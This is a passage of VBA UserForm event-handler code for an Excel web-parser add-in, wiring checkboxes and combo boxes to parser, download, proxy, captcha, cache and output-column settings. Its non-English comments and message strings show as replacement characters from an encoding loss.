    Me.MultiPage_OC_ColumnNumber.value = IIf(Me.CheckBox_ColumnAutoOrder, 1, 0)
    
    If StopEvents Then Exit Sub
    Me.ActiveParser.Columns.AutoOrder = Me.CheckBox_ColumnAutoOrder
    Me.ActiveParser.Columns.CalculateColumnOrder True
    Me.RefreshOutputColumnList
End Sub

Private Sub CheckBox_FastOutput_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.FastOutput = Me.CheckBox_FastOutput
End Sub

Private Sub CheckBox_MainWorkbook_Open_Click()
    On Error Resume Next: Me.ActiveParser.Options.Workbook_Open = Me.CheckBox_MainWorkbook_Open
End Sub
Private Sub CheckBox_MainWorkbook_CreateFile_Click()
    On Error Resume Next: Me.ActiveParser.Options.Workbook_Create = Me.CheckBox_MainWorkbook_CreateFile
End Sub
Private Sub CheckBox_MainWorkbook_Save_Click()
    On Error Resume Next: Me.ActiveParser.Options.Workbook_Save = Me.CheckBox_MainWorkbook_Save
End Sub
Private Sub CheckBox_MainWorkbook_ActivateSheet_Click()
    On Error Resume Next: Me.ActiveParser.Options.Workbook_Sheet = Me.CheckBox_MainWorkbook_ActivateSheet
    Me.TextBox_MainWorkbook_SheetName.Enabled = Me.CheckBox_MainWorkbook_ActivateSheet
End Sub

Private Sub CheckBox_OC_DynamicColumns_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.DynamicColumns = Me.CheckBox_OC_DynamicColumns
    Me.MultiPage_SelectedColumn.Pages("Page_OC_Multicolumn").Enabled = Not Me.ActiveColumn.DynamicColumns
    Me.TextBox_OC_ColumnName.Visible = Not Me.ActiveColumn.DynamicColumns
    Me.RefreshOutputColumnList
End Sub

'Private Sub CheckBox_OC_MulticolumnHeadersEnabled_Click()
'    On Error Resume Next
'    Me.ScrollBar_MulticolumnHeadersCount.Enabled = Me.CheckBox_OC_MulticolumnHeadersEnabled
'    Me.ComboBox_OC_MulticolumnHeadersCount.Enabled = Me.CheckBox_OC_MulticolumnHeadersEnabled
'    Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled.Enabled = Me.CheckBox_OC_MulticolumnHeadersEnabled
'    Me.TextBox_OC_MulticolumnHeadersSuffixValue.Enabled = Me.CheckBox_OC_MulticolumnHeadersEnabled And Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled
'
'    If StopEvents Then Exit Sub
'    Me.ActiveColumn.MulticolumnHeadersEnabled = Me.CheckBox_OC_MulticolumnHeadersEnabled
'    Me.RefreshOutputColumnList
'End Sub

Private Sub CheckBox_OC_MulticolumnHeadersSuffixEnabled_Click()
    On Error Resume Next
    Me.TextBox_OC_MulticolumnHeadersSuffixValue.Enabled = Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled
    If StopEvents Then Exit Sub
    Me.ActiveColumn.MulticolumnHeadersSuffixEnabled = Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled
End Sub

Private Sub CheckBox_OCs_SearchForRow_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SearchForRow = Me.CheckBox_OCs_SearchForRow
    Me.Label_OCs_SearchForRow_comment.Enabled = True
End Sub

Private Sub CheckBox_OCF_CommentEnable_Click()
    On Error Resume Next
    Me.TextBox_OCF_CommentText.Enabled = Me.CheckBox_OCF_CommentEnable
    
    If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.CommentEnable = Me.CheckBox_OCF_CommentEnable
End Sub

Private Sub CheckBox_OCF_PasteImage_AuthMode_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.PasteImage_AuthMode = Me.CheckBox_OCF_PasteImage_AuthMode
End Sub

Private Sub CheckBox_OCF_PasteImage_Click()
    Me.CheckBox_OCF_PasteImage_AuthMode.Enabled = Me.CheckBox_OCF_PasteImage
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.PasteImage = Me.CheckBox_OCF_PasteImage
End Sub

Private Sub CheckBox_OCF_RestoreHyperlink_Click()
    On Error Resume Next
    Me.TextBox_OCF_RestoredHyperlinkChangeCommand.Enabled = Me.CheckBox_OCF_RestoreHyperlink
    Me.Label_OCF_RestoredHyperlinkChangeCommand.Enabled = Me.CheckBox_OCF_RestoreHyperlink
    If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.RestoreHyperlink = Me.CheckBox_OCF_RestoreHyperlink
    Me.Load_ActiveColumn_Values
End Sub

Private Sub CheckBox_OSO_FormatColumns_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.FormatColumns = Me.CheckBox_OSO_FormatColumns
End Sub

Private Sub CheckBox_OSO_ScrollWorksheet_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.ScrollWorksheet = Me.CheckBox_OSO_ScrollWorksheet
End Sub

Private Sub CheckBox_PD_BasicAuthEnabled_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.BasicAuthEnabled = Me.CheckBox_PD_BasicAuthEnabled
End Sub

Private Sub CheckBox_PD_IgnoreErrors_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.IgnoreErrors = Me.CheckBox_PD_IgnoreErrors
End Sub

Private Sub CheckBox_PD_PostAuthEnabled_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.POST_Enabled = Me.CheckBox_PD_PostAuthEnabled
End Sub

Private Sub CheckBox_Protection_ActualVersion_Click()
    On Error Resume Next: Me.ActiveParser.Protection.ActualVersion = Me.CheckBox_Protection_ActualVersion
End Sub

Private Sub CheckBox_Protection_ArrayLimit_Click()
    On Error Resume Next: Me.ActiveParser.Protection.ArrayLimit = Me.CheckBox_Protection_ArrayLimit
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_Download_Common_Click()
    On Error Resume Next: Me.ActiveParser.Protection.Download_Common = Me.CheckBox_Protection_Download_Common
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_Extra_Actions_Click()
    On Error Resume Next: Me.ActiveParser.Protection.Extra_Actions = Me.CheckBox_Protection_Extra_Actions
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_Extra_Common_Click()
    On Error Resume Next: Me.ActiveParser.Protection.Extra_Common = Me.CheckBox_Protection_Extra_Common
    Me.CheckBox_Protection_Extra_Actions.Enabled = Me.CheckBox_Protection_Extra_Common
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_Output_Actions_Click()
    On Error Resume Next: Me.ActiveParser.Protection.Output_Actions = Me.CheckBox_Protection_Output_Actions
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_Output_Common_Click()
    On Error Resume Next: Me.ActiveParser.Protection.Output_Common = Me.CheckBox_Protection_Output_Common
    Me.CheckBox_Protection_Output_Actions.Enabled = Me.CheckBox_Protection_Output_Common
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_Replace_Click()
    On Error Resume Next: Me.ActiveParser.Protection.Replace = Me.CheckBox_Protection_Replace
End Sub

Private Sub CheckBox_Protection_SD_Actions_Click()
    On Error Resume Next: Me.ActiveParser.Protection.SD_Actions = Me.CheckBox_Protection_SD_Actions
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Protection_SD_Source_Click()
    On Error Resume Next: Me.ActiveParser.Protection.SD_Source = Me.CheckBox_Protection_SD_Source
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_Proxy_ReconnectOnSwitch_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveParser.Proxy.ReconnectOnSwitch = Me.CheckBox_Proxy_ReconnectOnSwitch.value
End Sub

Private Sub CheckBox_Proxy_Reuse_Click()
    On Error Resume Next: Me.ActiveParser.Proxy.Reuse = Me.CheckBox_Proxy_Reuse
End Sub

Private Sub CheckBox_Proxy_SaveAddressList_Click()
    On Error Resume Next: Me.ActiveParser.Proxy.SaveAddressList = Me.CheckBox_Proxy_SaveAddressList
End Sub

Private Sub CheckBox_Proxy_SwitchInCount_Enabled_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveParser.Proxy.SwitchInCountEnabled = Me.CheckBox_Proxy_SwitchInCount_Enabled
End Sub

Private Sub CheckBox_ProxyShowPopup_Click()
    On Error Resume Next: Me.ActiveParser.Proxy.ShowPopup = Me.CheckBox_ProxyShowPopup
End Sub

Private Sub CheckBox_RunParserFinishOnBreak_Click()
    Me.ActiveParser.Options.RunParserFinishOnBreak = Me.CheckBox_RunParserFinishOnBreak
End Sub

Private Sub CheckBox_SourceData_ExcludeValues_Click()
    On Error Resume Next: Me.ActiveParser.SourceData.NumRangeMode_ExcludeValues = Me.CheckBox_SourceData_ExcludeValues
    Me.ComboBox_SourceData_ExcludeValuesColumn.Enabled = Me.CheckBox_SourceData_ExcludeValues
    Me.ScrollBar_SourceData_ExcludeValuesColumn.Enabled = Me.CheckBox_SourceData_ExcludeValues
End Sub

Private Sub CheckBox_SourceData_Found_CheckColumnEnabled_Click()
    On Error Resume Next
    Dim en As Boolean: en = Me.CheckBox_SourceData_Found_CheckColumnEnabled.value
    Me.ComboBox_SourceData_Found_CheckColumnOffset.Enabled = en
    Me.ScrollBar_SourceData_Found_CheckColumnOffset.Enabled = en
    Me.TextBox_SourceData_Found_CheckColumnMask.Enabled = en
    Me.CheckBox_SourceData_Found_CheckColumnEnabled.Font.Bold = en
    Me.Label_SourceData_Found_CheckColumn.Font.Bold = en
    
    Me.ActiveParser.SourceData.FoundColumnMode_CheckColumnEnabled = Me.CheckBox_SourceData_Found_CheckColumnEnabled
End Sub

Private Sub CheckBox_SourceData_Found_UseCellText_Click()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_UseCellText = Me.CheckBox_SourceData_Found_UseCellText
    Me.CheckBox_SourceData_Found_UseCellText.Font.Bold = Me.CheckBox_SourceData_Found_UseCellText.value
End Sub

Private Sub CheckBox_OC_MulticolumnEnabled_Click()
    On Error Resume Next
    Me.ComboBox_OC_MulticolumnStep.Enabled = Me.CheckBox_OC_MulticolumnEnabled
    Me.ScrollBar_MulticolumnStep.Enabled = Me.CheckBox_OC_MulticolumnEnabled
    Me.Label_OC_MulticolumnHeadersEnabled.Enabled = Me.CheckBox_OC_MulticolumnEnabled
    
    Me.ScrollBar_MulticolumnHeadersCount.Enabled = Me.CheckBox_OC_MulticolumnEnabled
    Me.ComboBox_OC_MulticolumnHeadersCount.Enabled = Me.CheckBox_OC_MulticolumnEnabled
    Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled.Enabled = Me.CheckBox_OC_MulticolumnEnabled
    Me.TextBox_OC_MulticolumnHeadersSuffixValue.Enabled = Me.CheckBox_OC_MulticolumnEnabled And Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled
    
    Me.CheckBox_OC_DynamicColumns.Enabled = Not Me.CheckBox_OC_MulticolumnEnabled
    
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.MulticolumnEnabled = Me.CheckBox_OC_MulticolumnEnabled
    Me.RefreshOutputColumnList
End Sub

Private Sub CheckBox_OCF_HyperlinkEnable_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.HyperlinkEnable = Me.CheckBox_OCF_HyperlinkEnable
    Me.Load_ActiveColumn_Values
End Sub

Private Sub CheckBox_OCF_WrapText_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.WrapText = Me.CheckBox_OCF_WrapText.value
End Sub

Private Sub CheckBox_PD_OpenFolderOnFinish_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.OpenFolderOnFinish = Me.CheckBox_PD_OpenFolderOnFinish
End Sub

Private Sub CheckBox_OSO_ClearSheetOnStart_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.ClearSheetOnStart = Me.CheckBox_OSO_ClearSheetOnStart
End Sub

Private Sub CheckBox_OSO_CreateNewWorkbook_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.CreateNewWorkbook = Me.CheckBox_OSO_CreateNewWorkbook
End Sub

Private Sub CheckBox_OSO_OutputColumnsNames_Click()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.OutputColumnsNames = Me.CheckBox_OSO_OutputColumnsNames
End Sub

Private Sub CheckBox_OC_OutputEnabled_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.OutputEnabled = Me.CheckBox_OC_OutputEnabled
    Me.RefreshOutputColumnList
End Sub

Private Sub CheckBox_OutputArrayValuesToSeparateRows_Click()
    Me.ActiveParser.Columns.OutputArrayValuesToSeparateRows = Me.CheckBox_OutputArrayValuesToSeparateRows
End Sub

Private Sub CheckBox_PD_NeedAuth_Click()
    On Error Resume Next
    Me.Frame_PD_BasicAuth.Visible = Me.CheckBox_PD_NeedAuth
    Me.Frame_PD_PostAuth.Visible = Me.CheckBox_PD_NeedAuth
    Me.Frame_PD_CheckResponseHeaders.Visible = Me.CheckBox_PD_NeedAuth
    
    If StopEvents Then Exit Sub
    Me.ActiveDownload.NeedAuth = Me.CheckBox_PD_NeedAuth
End Sub

Private Sub CheckBox_ShowPrInd1_Click()
    Me.ActiveParser.Options.ShowPrInd1 = Me.CheckBox_ShowPrInd1
End Sub
Private Sub CheckBox_ShowPrInd2_Click()
    Me.ActiveParser.Options.ShowPrInd2 = Me.CheckBox_ShowPrInd2
End Sub

Private Sub CheckBox_SourceData_CheckColumnEnabled_Click()
    On Error Resume Next
    Dim en As Boolean: en = Me.CheckBox_SourceData_CheckColumnEnabled.value
    Me.ComboBox_SourceData_CheckColumnNumber.Enabled = en
    Me.ScrollBar_SourceData_CheckColumnNumber.Enabled = en
    Me.TextBox_SourceData_CheckColumnMask.Enabled = en
    Me.CheckBox_SourceData_CheckColumnEnabled.Font.Bold = en
    Me.Label_SourceData_CheckColumn.Font.Bold = en
    
    Me.ActiveParser.SourceData.ColumnMode_CheckColumnEnabled = Me.CheckBox_SourceData_CheckColumnEnabled
End Sub

Private Sub CheckBox_SourceData_Found_SelectedRowsOnly_Click()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_SelectedRowsOnly = Me.CheckBox_SourceData_Found_SelectedRowsOnly
    Me.CheckBox_SourceData_Found_SelectedRowsOnly.Font.Bold = Me.CheckBox_SourceData_Found_SelectedRowsOnly.value
End Sub

Private Sub CheckBox_SourceData_SelectedRowsOnly_Click()
    On Error Resume Next: Me.ActiveParser.SourceData.ColumnMode_SelectedRowsOnly = Me.CheckBox_SourceData_SelectedRowsOnly
    Me.CheckBox_SourceData_SelectedRowsOnly.Font.Bold = Me.CheckBox_SourceData_SelectedRowsOnly.value
End Sub

Private Sub CheckBox_SourceData_SomeFixedValues_Click()
    On Error Resume Next
    Me.ActiveParser.SourceData.FixedValueMode_SomeValues = Me.CheckBox_SourceData_SomeFixedValues.value
    Dim v As Boolean: v = Me.CheckBox_SourceData_SomeFixedValues.value
    With Me.TextBox_SourceData_FixedValue
        .Height = IIf(v, 64, 19)
        .MultiLine = v
        .ScrollBars = IIf(v, fmScrollBarsBoth, fmScrollBarsNone)
    End With
End Sub

Private Sub CheckBox_SourceData_UseCellText_Click()
    On Error Resume Next: Me.ActiveParser.SourceData.ColumnMode_UseCellText = Me.CheckBox_SourceData_UseCellText
    Me.CheckBox_SourceData_UseCellText.Font.Bold = Me.CheckBox_SourceData_UseCellText.value
End Sub


Private Sub CheckBox_UseProxy_Click()
    On Error Resume Next
    '  Me.ActiveParser.Options.UseProxy = Me.CheckBox_UseProxy ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Me.ActiveParser.Proxy.Enabled = Me.CheckBox_UseProxy
    Me.CheckBox_UseProxy.Font.Bold = Me.CheckBox_UseProxy
    If Me.CheckBox_UseProxy Then
        Dim v
        v = Me.CheckBox_Proxy_SwitchInCount_Enabled
        Me.CheckBox_Proxy_SwitchInCount_Enabled.value = Null
        Me.CheckBox_Proxy_SwitchInCount_Enabled.value = v
    End If
End Sub

Private Sub CheckBox_WP_AnotherCache_Click()
    On Error Resume Next: Me.ActiveParser.Options.AnotherCache = Me.CheckBox_WP_AnotherCache
    Me.ComboBox_AnotherCache_Name.Enabled = Me.CheckBox_WP_AnotherCache
End Sub

Private Sub CheckBox_WP_Locked_Change()
    On Error Resume Next: Me.ActiveParser.Locked = Me.CheckBox_WP_Locked
    Me.LockParserEditForm
End Sub

Private Sub CheckBox_WP_Locked_Click()
    On Error Resume Next
    Me.CheckBox_Protection_Output_Actions.Enabled = Me.CheckBox_Protection_Output_Common And Me.CheckBox_WP_Locked
    Me.CheckBox_Protection_Extra_Actions.Enabled = Me.CheckBox_Protection_Extra_Common And Me.CheckBox_WP_Locked
End Sub

Private Sub CheckBox_WP_NeedsOpenedWorkbook_Click()
    On Error Resume Next: Me.ActiveParser.Options.NeedsOpenedWorkbook = Me.CheckBox_WP_NeedsOpenedWorkbook
End Sub
Private Sub CheckBox_WP_ShowErrors_Click()
    On Error Resume Next: Me.ActiveParser.Options.ShowErrors = Me.CheckBox_WP_ShowErrors
End Sub
Private Sub CheckBox_WP_InterruptOnError_Click()
    On Error Resume Next: Me.ActiveParser.Options.InterruptOnError = Me.CheckBox_WP_InterruptOnError
End Sub

Private Sub CheckBox_WP_UseCache_Click()
    On Error Resume Next: Me.ActiveParser.Options.UseCache = IIf(Me.CheckBox_WP_UseCache, 1, 0)
End Sub

Private Sub CheckBox_WP_UseFileCache_Click()
    On Error Resume Next: Me.ActiveParser.Options.UseFileCache = Me.CheckBox_WP_UseFileCache
End Sub

Private Sub ComboBox_ActionSet_SelectSpecialName_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    If Me.ComboBox_ActionSet_SelectSpecialName.ListIndex >= 0 Then
        Me.TextBox_ActionSet_Name = Split(Me.ComboBox_ActionSet_SelectSpecialName.text, " ")(0)
        Me.ComboBox_ActionSet_SelectSpecialName.ListIndex = -1
        Me.CommandButton_EditActions_ActionSet.SetFocus
    End If
End Sub

Private Sub ComboBox_AnotherCache_Name_Change()
    On Error Resume Next: Me.ActiveParser.Options.AnotherCacheName = Me.ComboBox_AnotherCache_Name
End Sub

Private Sub ComboBox_CaptchaAttempts_Change()
    On Error Resume Next: Me.ActiveParser.Options.CaptchaAttempts = Me.ComboBox_CaptchaAttempts
End Sub

Private Sub ComboBox_CaptchaDetectionText_Change()
    On Error Resume Next: Me.ActiveParser.Options.CaptchaDetectionText = Me.ComboBox_CaptchaDetectionText
End Sub

Private Sub ComboBox_CaptchaHandler_Change()
    On Error Resume Next: Me.ActiveParser.Options.CaptchaHandler = Me.ComboBox_CaptchaHandler
End Sub

Private Sub ComboBox_ColumnAutoOrder_FirstColumn_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveParser.Columns.AutoOrder_FirstColumn = Val(Me.ComboBox_ColumnAutoOrder_FirstColumn)
    Me.RefreshOutputColumnList
End Sub

Private Sub ComboBox_DownloadURL_AddFromVariable_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_DownloadURL_AddFromVariable)
    If Len(txt) Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        With Me.ActiveDownload.Actions
            While .Items.Count > 0
                .Items.Remove 1
            Wend
            
            With .AddNewAction("GetVariable")
                .parameters(1).value = Replace(txt, "%", "")
            End With
        End With
        Me.ComboBox_DownloadURL_AddFromVariable.ListIndex = -1
        Load_ActiveDownload_Values
    End If
End Sub

Private Sub ComboBox_DownloadFilename_AddFromVariable_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_DownloadFilename_AddFromVariable)
    If Len(txt) Then Me.TextBox_DownloadSaveOptions_FilenameMask = txt: Me.ComboBox_DownloadFilename_AddFromVariable.ListIndex = -1: Me.TextBox_DownloadSaveOptions_FilenameMask.SetFocus
End Sub

Private Sub ComboBox_HL_AddFromVariable_Text_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_HL_AddFromVariable_Text)
    If Len(txt) Then Me.TextBox_OCF_HyperlinkTextToDisplay = txt: Me.ComboBox_HL_AddFromVariable_Text.ListIndex = -1: Me.TextBox_OCF_HyperlinkTextToDisplay.SetFocus
End Sub
Private Sub ComboBox_HL_AddFromVariable_URL_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_HL_AddFromVariable_URL)
    If Len(txt) Then Me.TextBox_OCF_HyperlinkURL = txt: Me.ComboBox_HL_AddFromVariable_URL.ListIndex = -1: Me.TextBox_OCF_HyperlinkURL.SetFocus
End Sub

Private Sub ComboBox_MainActions_Level_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    With Me.ActiveParser.SourceData.Actions
        .GetActionsByLevel(Val(Me.ComboBox_MainActions_Level.value)).Activate
        Me.ListBox_Actions_Main.list = .GetActiveActions.ToArray(, True)
    End With
    Update_LevelButtons
End Sub

Private Sub ComboBox_OC_MulticolumnHeadersCount_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.MulticolumnHeadersCount = Val(Me.ComboBox_OC_MulticolumnHeadersCount)
    Me.RefreshOutputColumnList
End Sub

Private Sub ComboBox_OC_MulticolumnStep_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.MulticolumnStep = Val(Me.ComboBox_OC_MulticolumnStep)
    Me.RefreshOutputColumnList
End Sub

Private Sub ComboBox_OC_QS_FromVariable_Change()
    On Error Resume Next: Dim txt$: txt = Trim(Me.ComboBox_OC_QS_FromVariable)
    If Len(txt) Then
        With Me.ActiveColumn.Actions.AddNewAction("GetVariable")
            .parameters.item("Name").value = Replace(txt, "%", "")
        End With
        Me.ComboBox_OC_QS_FromVariable.ListIndex = -1
        Me.UpdateArrayActions
    End If
End Sub

Private Sub ComboBox_OCF_ColumnWidth_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.ColumnWidth = Me.ComboBox_OCF_ColumnWidth
End Sub

Private Sub ComboBox_OCF_HeaderColor_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.HeaderColor = Me.ComboBox_OCF_HeaderColor.value
End Sub

Private Sub ComboBox_OCF_HorizontalAlignment_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    If Me.ComboBox_OCF_HorizontalAlignment.ListIndex >= 0 Then Me.ActiveColumn.Format.HorizontalAlignment = Me.ComboBox_OCF_HorizontalAlignment.ListIndex
End Sub

Private Sub ComboBox_OCs_SearchForRow_Column_Change()
    On Error Resume Next: Me.ActiveParser.Columns.SearchForRow_Column = Val(ComboBox_OCs_SearchForRow_Column)
End Sub

Private Sub ComboBox_Protection_ArrayLimit_Count_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    If Val(Me.ComboBox_Protection_ArrayLimit_Count) Then Me.ActiveParser.Protection.ArrayLimit_Count = Val(Me.ComboBox_Protection_ArrayLimit_Count)
End Sub

Private Sub ComboBox_Protection_ReplaceInterval_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    If Val(Me.ComboBox_Protection_ReplaceInterval) Then Me.ActiveParser.Protection.ReplaceInterval = Val(Me.ComboBox_Protection_ReplaceInterval)
End Sub

Private Sub ComboBox_Proxy_Check_Presets_Change()
    On Error Resume Next: Dim arr
    If Me.StopEvents Then Exit Sub
    If Me.ComboBox_Proxy_Check_Presets.ListIndex >= 0 Then
        arr = Split(Me.ComboBox_Proxy_Check_Presets, ARSEP)
        
        Me.TextBox_Proxy_Check_URL = arr(0)
        Me.TextBox_Proxy_Check_HTMLfilter = arr(1)
        Me.TextBox_Proxy_Check_SuccessMask = arr(2)
        Me.TextBox_Proxy_Check_FailMask = arr(3)
        
        Me.ComboBox_Proxy_Check_Presets.ListIndex = -1
        Me.TextBox_Proxy_Check_URL.SetFocus
    End If
End Sub

Private Sub ComboBox_Proxy_StatsClearInterval_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveParser.Proxy.StatsClearInterval = Val(Me.ComboBox_Proxy_StatsClearInterval)
End Sub

Private Sub ComboBox_Proxy_SwitchInCount_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveParser.Proxy.SwitchInCount = Val(Me.ComboBox_Proxy_SwitchInCount)
End Sub

Private Sub ComboBox_ProxyAttempts_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveParser.Proxy.Attempts = Val(Me.ComboBox_ProxyAttempts)
End Sub

Private Sub ComboBox_ScreenUpdatingInterval_Change()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.ScreenUpdatingInterval = Val(Me.ComboBox_ScreenUpdatingInterval)
End Sub

Private Sub ComboBox_SheetBaseColumn_Change()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.BaseColumn = Val(Me.ComboBox_SheetBaseColumn)
End Sub

Private Sub ComboBox_SheetHeaderRow_Change()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.HeaderRowNumber = Val(Me.ComboBox_SheetHeaderRow)
End Sub

Private Sub ComboBox_SheetRangeMode_Find_Type_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.SheetRangeMode_Find_Type = Me.ComboBox_SheetRangeMode_Find_Type.ListIndex
End Sub

Private Sub ComboBox_SheetRangeMode_SearchRange_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.SheetRangeMode_SearchRange = Trim(Split(" " & Me.ComboBox_SheetRangeMode_SearchRange, "(")(0))
End Sub

Private Sub ComboBox_SheetZoom_Change()
    On Error Resume Next: Me.ActiveParser.Columns.SheetOptions.Zoom = Val(Me.ComboBox_SheetZoom)
End Sub

Private Sub ComboBox_SourceData_CheckColumnNumber_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.ColumnMode_CheckColumnNumber = Val(Me.ComboBox_SourceData_CheckColumnNumber)
End Sub

Private Sub ComboBox_SourceData_ColumnOffset_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_Find_ColumnOffset = Val(Me.ComboBox_SourceData_ColumnOffset)
End Sub

Private Sub ComboBox_SourceData_ExcludeValuesColumn_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.NumRangeMode_ExcludeValuesColumn = Val(Me.ComboBox_SourceData_ExcludeValuesColumn)
End Sub

Private Sub ComboBox_SourceData_Find_Row_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_Find_Row = Val(Me.ComboBox_SourceData_Find_Row)
End Sub

Private Sub ComboBox_SourceData_Found_CheckColumnOffset_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_CheckColumnOffset = Val(Me.ComboBox_SourceData_Found_CheckColumnOffset)
End Sub

Private Sub ComboBox_SourceData_Found_FirstRow_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_FirstRow = Val(Me.ComboBox_SourceData_Found_FirstRow)
End Sub

Private Sub ComboBox_SourceData_Mode_Change()
    On Error Resume Next
    Me.MultiPage_SourceData_Mode.value = Me.ComboBox_SourceData_Mode.ListIndex + 1
    Me.ActiveParser.SourceData.Mode = Me.ComboBox_SourceData_Mode.ListIndex + 1
End Sub

Private Sub ComboBox_WP_Pause_Change()
    On Error Resume Next: Me.ActiveParser.Options.Pause = Val(Replace(Me.ComboBox_WP_Pause, ",", "."))
End Sub

Private Sub ComboBox_WP_Timeout_Change()
    On Error Resume Next: Me.ActiveParser.Options.RequestTimeout = Val(Me.ComboBox_WP_Timeout)
End Sub

Private Sub ComboBox_WP_RetryCountOnError_Change()
    On Error Resume Next: Me.ActiveParser.Options.RetryCountOnError = Val(Me.ComboBox_WP_RetryCountOnError)
End Sub

Private Sub CommandButton_ActionSet_Execute_Click()
    On Error Resume Next: Dim txt$
    Me.ActiveActionSet.Execute txt$
    AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b> " & IIf(Len(Me.ActiveActionSet.Name), "|fffd|" & Me.ActiveActionSet.Name & "|fffd|", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & vbNewLine & _
        IIf(Len(txt), "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: </b>" & vbNewLine & FormatTextForBalloon(txt), "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), bt_Information
End Sub

Private Sub CommandButton_ClearCacheFolder_Click()
    On Error Resume Next: Me.ActiveParser.ClearCacheFolder
End Sub

Private Sub CommandButton_CreateFirstVariable_Click()
    On Error Resume Next
    Me.ActiveParser.Variables.Create True
    Me.RefreshVariablesList
End Sub

Private Sub CommandButton_EditActions_ActionSet_Click()
    On Error Resume Next: Me.ActiveActionSet.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveActionSet.Name & "|fffd|"
End Sub

Private Sub CommandButton_EditVariables_Click()
    On Error Resume Next
